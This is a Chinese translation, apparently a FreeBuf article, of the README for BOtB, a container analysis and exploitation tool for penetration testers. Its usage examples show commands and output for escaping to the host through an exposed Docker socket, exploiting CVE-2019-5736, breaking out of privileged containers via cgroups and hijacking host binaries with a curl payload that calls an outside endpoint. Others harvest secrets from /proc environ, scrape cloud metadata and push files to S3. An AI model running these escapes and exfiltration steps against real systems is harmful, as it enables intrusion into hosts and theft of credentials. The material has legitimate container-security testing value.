**BOtB（Break out the Box）是一款容器分析和漏洞利用工具，其主要是为渗透测试人员和工程师所设计的。**

##  它可以为我们做什么？

BOtB是一个CLI工具，你可以执行以下操作：

> 利用常见的容器漏洞
>
> 执行常见的容器后期利用操作
>
> 当某些工具或二进制文件在容器中不可用时提供功能
>
> 使用BOtB的功能与CI/CD技术来测试容器部署
>
> 以手动或自动方式执行以上操作

##  当前功能

> 查找和识别UNIX域套接字
>
> 识别支持HTTP的UNIX域套接字
>
> 在UNIX域套接字或接口上查找并标识Docker Daemon
>
> 分析和识别ENV和在ProcFS中（例如/Proc/{pid}/Environ）进程的敏感字符串
>
> 识别元数据服务端点，即[http://169.254.169.254](http://169.254.169.254/)
>
> 通过暴露的Docker Daemon执行容器突破
>
> 通过CVE-2019-5736执行容器突破
>
> 使用自定义payload劫持主机二进制文件
>
> 以CI/CD模式执行操作，仅返回> 0退出代码
>
> 从GCP元数据端点中抓取元数据信息
>
> 将数据推送到s3 bucket
>
> 突破特权容器
>
> 强制BOtB始终返回Exit代码0（对非阻塞CI/CD有用）
>
> 从CLI参数或从YAML配置文件执行以上操作

##  获取 BOtB

BOtB在发行版中以二进制形式提供。

##  构建 BOtB

BOtB是用GO编写的，因此你可以使用标准的GO工具来构建。你可以执行以下操作：

获取代码：

    
    
    go get github.com/brompwnie/botb
    or
    git clone git@github.com:brompwnie/botb.git

构建代码：

    
    
    govendor init
    govendor add github.com/tv42/httpunix
    govendor add github.com/kr/pty
    go build -o botbsBinary

##  使用

可以将BOTB编译为目标平台的二进制文件，支持的用法如下：‘

    
    
    Usage of ./botb:
    -aggr string
            Attempt to exploit RuncPWN (default "nil")
      -always-succeed
            Always set BOtB's Exit code to Zero
      -autopwn
            Attempt to autopwn exposed sockets
      -cicd
            Attempt to autopwn but don't drop to TTY,return exit code 1 if successful else 0
      -config string
            Load config from provided yaml file (default "nil")
      -endpointlist string
            Provide a textfile with endpoints to test (default "nil")
      -find-docker
            Attempt to find Dockerd
      -find-http
            Hunt for Available UNIX Domain Sockets with HTTP
      -find-sockets
            Hunt for Available UNIX Domain Sockets
      -hijack string
            Attempt to hijack binaries on host (default "nil")
      -metadata
            Attempt to find metadata services
      -path string
            Path to Start Scanning for UNIX Domain Sockets (default "/")
      -pwn-privileged string
            Provide a command payload to try exploit --privilege CGROUP release_agent's (default "nil")
      -recon
            Perform Recon of the Container ENV
      -region string
            Provide a AWS Region e.g eu-west-2 (default "nil")
      -s3bucket string
            Provide a bucket name for S3 Push (default "nil")
      -s3push string
            Push a file to S3 e.g Full command to push to https://YOURBUCKET.s3.eu-west-2.amazonaws.com/FILENAME would be: -region eu-west-2 -s3bucket YOURBUCKET -s3push FILENAME (default "nil")
      -scrape-gcp
            Attempt to scrape the GCP metadata service
      -verbose
            Verbose output
      -wordlist string
            Provide a wordlist (default "nil")

还可以指示BOtb通过config参数从YAML文件加载设置

    
    
    # ./botb -config=cfg.yml
    [+] Break Out The Box
    [+] Loading Config: cfg.yml
    ...

以下用法示例在检测到异常时默认情况下将返回退出代码> 0，这由“echo $?”表示。 显示最后执行命令的退出代码。

**查找 UNIX 域套接字**

    
    
    #./bob_linux_amd64 -socket=true
    [+] Break Out The Box
    [+] Hunting Down UNIX Domain Sockets from: /
    [!] Valid Socket: /var/meh
    [+] Finished
    #echo $?
    1

**查找 Docker Daemon**

    
    
    #./bob_linux_amd64 -find-docker=true
    [+] Break Out The Box
    [+] Looking for Dockerd
    [!] Dockerd DOCKER_HOST found: tcp://0.0.0.0:2375
    [+] Hunting Docker Socks
    [!] Valid Docker Socket: /var/meh
    [+] Finished
    #echo $?
    1

**通过暴露的 Docker Daemon 突破容器**

这种方法将在主机上突破为交互式TTY。

    
    
    #./bob_linux_amd64 -autopwn=true    
    [+] Break Out The Box
    [+] Attempting to autopwn
    [+] Hunting Docker Socks
    [+] Attempting to autopwn:  /var/meh
    [+] Attempting to escape to host...
    [+] Attempting in TTY Mode
    ./docker/docker -H unix:///var/meh run -t -i -v /:/host alpine:latest /bin/sh
    chroot /host && clear
    echo 'You are now on the underlying host'
    You are now on the underlying host
    / #

**以 CI/CD 友好方式突破容器**

这种方法不会逃逸到主机上的TTY中，而是返回退出代码> 0来指示容器成功突破。

    
    
    #./bob_linux_amd64 -autopwn=true -cicd=true
    [+] Break Out The Box
    [+] Attempting to autopwn
    [+] Hunting Docker Socks
    [+] Attempting to autopwn:  /var/meh
    [+] Attempting to escape to host...
    [!] Successfully escaped container
    [+] Finished
    #echo $?
    1

**使用自定义 payload 利用 CVE-2019-5736**

请注意，在该场景下要想有效利用，必须在目标容器中执行一个进程。

    
    
    #./bob_linux_amd64 -aggr='curl "https://some.endpoint.com?command=$0&ampparam1=$1&ampparam2=$2">/dev/null 2>&1'
    [+] Break Out The Box[!] WARNING THIS OPTION IS NOT CICD FRIENDLY, THIS WILL PROBABLY BREAK THE CONTAINER RUNTIME BUT YOU MIGHT GET SHELLZ...
    [+] Attempting to exploit CVE-2019-5736 with command:  curl "https://bobendpoint.herokuapp.com/canary/bobby?command=$0&ampparam1=$
    1&ampparam2=$2">/dev/null 2>&1
    [+] This process will exit IF an EXECVE is called in the Container or if the Container is manually stopped
    [+] Finished

**使用自定义 payload 在主机上劫持命令/二进制文件**

请注意，这可用于测试外部实体是否正在容器内执行命令。例如Docker Exec和Kubetcl CP。

    
    
    #./bob_linux_amd64 -hijack='curl "https://bobendpoint.herokuapp.com/canary/bobby?command=$0&ampparam1=$
    1&ampparam2=$2">/dev/null 2>&1'
    [+] Break Out The Box
    [!] WARNING THIS WILL PROBABLY BREAK THE CONTAINER BUT YOU MAY GET SHELLZ...
    [+] Attempting to hijack binaries
    [*] Command to be used:  curl "https://bobendpoint.herokuapp.com/canary/bobby?command=$0&ampparam1=$1&ampparam2=$2">/dev/null 2>&1
    [+] Currently hijacking:  /bin
    [+] Currently hijacking:  /sbin
    [+] Currently hijacking:  /usr/bin
    [+] Finished

**分析 ENV 和 ProcFS 环境中的敏感字符串**

默认情况下，BOtB将搜索“secret”和“password”。

    
    
     ./bob_linux_amd64 -recon=true
    [+] Break Out The Box
    [+] Performing Container Recon
    [+] Searching /proc/* for data
    [!] Sensitive keyword found in: /proc/1/environ -> 'PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=0e51200113eaTERM=xtermGOLANG_VERSION=1.12.4GOPATH=/gofoo=secretpasswordHOME=/root'
    [!] Sensitive keyword found in: /proc/12/environ -> 'GOLANG_VERSION=1.12.4HOSTNAME=0e51200113eaGOPATH=/goPWD=/app/binHOME=/rootfoo=secretpasswordTERM=xtermSHLVL=1PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=./bob_linux_amd64OLDPWD=/bin'
    [!] Sensitive keyword found in: /proc/self/environ -> 'HOSTNAME=0e51200113eaSHLVL=1HOME=/rootfoo=secretpasswordOLDPWD=/bin_=./bob_linux_amd64TERM=xtermPATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGOPATH=/goPWD=/app/binGOLANG_VERSION=1.12.4'
    [!] Sensitive keyword found in: /proc/thread-self/environ -> 'HOSTNAME=0e51200113eaSHLVL=1HOME=/rootfoo=secretpasswordOLDPWD=/bin_=./bob_linux_amd64TERM=xtermPATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGOPATH=/goPWD=/app/binGOLANG_VERSION=1.12.4'
    [+] Checking ENV Variables for secrets
    [!] Sensitive Keyword found in ENV:  foo=secretpassword
    [+] Finished
    #echo $?
    1

可以将wordlist提供给BOtB以扫描特定的关键字。

    
    
    #cat wordlist.txt 
    moo
    # ./bob_linux_amd64 -recon=true -wordlist=wordlist.txt
    [+] Break Out The Box
    [+] Performing Container Recon
    [+] Searching /proc/* for data
    [*] Loading entries from: wordlist.txt
    [+] Checking ENV Variables for secrets
    [*] Loading entries from: wordlist.txt
    [+] Finished
    # echo $?
    0

**扫描元数据端点**

默认情况下，BOtB扫描两个元数据端点。

    
    
    #  ./bob_linux_amd64 -metadata=true                    
    [+] Break Out The Box
    [*] Attempting to query metadata endpoint: 'http://169.254.169.254/latest/meta-data/'
    [*] Attempting to query metadata endpoint: 'http://kubernetes.default.svc/'
    [+] Finished
    # echo $?
    0

还可以提供需要扫描的端点列表。

    
    
    #  cat endpoints.txt 
    https://heroku.com
    #  ./bob_linux_amd64 -metadata=true -endpointlist=endpoints.txt
    [+] Break Out The Box
    [*] Loading entries from: endpoints.txt
    [*] Attempting to query metadata endpoint: 'https://heroku.com'
    [!] Reponse from 'https://heroku.com' -> 200
    [+] Finished
    # echo $?
    1

**获取接口和 IP**

    
    
    #  ./bob_linux_amd64 -interfaces=true
    [+] Break Out The Box
    [+] Attempting to get local network interfaces
    [*] Got Interface: lo
            [*] Got address: 127.0.0.1/8
    [*] Got Interface: tunl0
    [*] Got Interface: ip6tnl0
    [*] Got Interface: eth0
            [*] Got address: 172.17.0.3/16
    [+] Finished

**扫描响应 HTTP 的 UNIX 域套接字**

    
    
    #  ./bob_linux_amd64 -find-http=true
    [+] Break Out The Box
    [+] Looking for HTTP enabled Sockets
    [!] Valid HTTP Socket: /var/run/docker.sock
    [+] Finished

**从 GCP 元数据实例中抓取数据**

    
    
    #  ./botb_linux_amd64 -scrape-gcp=true
    [+] Break Out The Box
    [+] Attempting to connect to:  169.254.169.254:80
    [*] Output->
     HTTP/1.0 200 OK
    Metadata-Flavor: Google
    Content-Type: application/text
    Date: Sun, 30 Jun 2019 21:53:41 GMT
    Server: Metadata Server for VM
    Connection: Close
    Content-Length: 21013
    X-XSS-Protection: 0
    X-Frame-Options: SAMEORIGIN
    0.1/meta-data/attached-disks/disks/0/deviceName persistent-disk-0
    0.1/meta-data/attached-disks/disks/0/index 0
    0.1/meta-data/attached-disks/disks/0/mode READ_WRITE
    .....

**将数据推送到 AWS S3 Bucket**

    
    
    #  ./bob_linux_amd64 -s3push=fileToPush.tar.gz -s3bucket=nameOfS3Bucket -region=eu-west-2
    [+] Break Out The Box
    [+] Pushing fileToPush.tar.gz -> nameOfS3Bucket
    [*] Data uploaded to: https://nameOfS3Bucket.s3.eu-west-2.amazonaws.com/fileToPush.tar.gz
    [+] Finishedtu'po

**突破特权容器**

    
    
    #  ./bob_linux_amd64 -pwn-privileged=hostname
    [+] Break Out The Box
    [+] Attempting to exploit CGROUP Privileges
    [*] The result of your command can be found in /output
    [+] Finished
    root@418fa238e34d:/app# cat /output 
    docker-desktop

**强制 botb 始终成功，退出代码为 0**

这对于非阻塞CI/CD测试很有用

    
    
    #  ./bob_linux_amd64 -pwn-privileged=hostname -always-succeed-true
    [+] Break Out The Box
    [+] Attempting to exploit CGROUP Privileges
    [*] The result of your command can be found in /output
    [+] Finished
    # echo $?
    0

**将 BOtB 与 YAML 配置文件一起使用**

示例YAML文件cfg.yml

    
    
    payload: id
    verbose: false
    always-succeed: true
    cicd: false
    endpointlist: endpoints.txt
    wordlist: wordlist.txt
    path: /
    mode: find-sockets

使用以上YAML运行BOtB

    
    
    #  ./bob_linux_amd64 -config=cfg.yml
    [+] Break Out The Box
    [+] Loading Config: cfg.yml
    [+] Looking for UNIX Domain Sockets from: /
    [!] Valid Socket: /tmp/thisisnotasocket.mock
    [+] Finished

##  将 BOtB 与 CI\CD 一起使用

BOtB可以与CI\CD技术一起使用，其利用退出代码来确定测试是否已经通过或失败。以下是执行两个BOtB测试的Shell脚本，这两个测试的退出代码用于设置Shell脚本的退出。如果两个测试中的任何一个返回的退出代码>0，则执行shell脚本的测试将失败。

    
    
    #!/bin/sh 
    exitCode=0
    echo "[+] Testing UNIX Sockets"
    ./bob_linux_amd64 -autopwn -cicd=true
    exitCode=$?
    echo "[+] Testing Env"
    ./bob_linux_amd64 -recon=true
    exitCode=$?
    (exit $exitCode)

以上脚本并不是将BOtB与CI\CD技术一起使用的唯一方法，也可以不包装在shell脚本中单独使用。一个示例YML配置如下：

    
    
    version: 2
    cicd:
      runATest: ./bob_linux_amd64 -autopwn -cicd=true

以下是可与Heroku CI一起使用的示例配置：

    
    
    {
        "environments": {
            "test": {
                "scripts": {
                    "test": "./bob_linux_amd64 -autopwn -cicd=true"
                }
            }
        }
    }

以下是Heroku CI的示例配置，但使用了wrapper shell脚本：

    
    
    {
        "environments": {
            "test": {
                "scripts": {
                    "test": "./bin/testSocksAndEnv.sh"
                }
            }
        }
    }

##  问题，错误和改进

如果你有任何疑问及改进建议，都可以通过提交issue来告诉我们。

##  参考文献与资源

如果没有社区中其他人的贡献，那么也就不会有这款工具，以下是对我有帮助的资源列表。

> <https://docs.docker.com/engine/security/https/>
>
> <https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#cp>
>
> <https://docs.docker.com/engine/reference/commandline/exec/>
>
> <https://github.com/GoogleContainerTools/container-structure-test>
>
> <https://github.com/coreos/clair>
>
> <https://github.com/aquasecurity/docker-bench>
>
> <https://www.cisecurity.org/benchmark/docker/>
>
> <https://github.com/Frichetten/CVE-2019-5736-PoC>
>
> <https://www.twistlock.com/labs-blog/breaking-docker-via-runc-explaining-> cve-2019-5736/>
>
> <https://www.twistlock.com/labs-blog/disclosing-directory-traversal-> vulnerability-kubernetes-copy-cve-2019-1002101/>
>
> <https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-classic-> platform.html>
>
> <https://github.com/wagoodman/dive>
>
>
> <https://github.com/cji/talks/blob/master/BruCON2018/Outside%20The%20Box%20-%20BruCON%202018.pdf>
>
> <https://github.com/singe/container-breakouts>
>
> <https://blog.trailofbits.com/2019/07/19/understanding-docker-container-> escapes/>
>
> <https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-> ever/>

***参考来源：[GitHub](https://github.com/brompwnie/botb)，FB小编secist编译，转载请注明来自FreeBuf.COM**

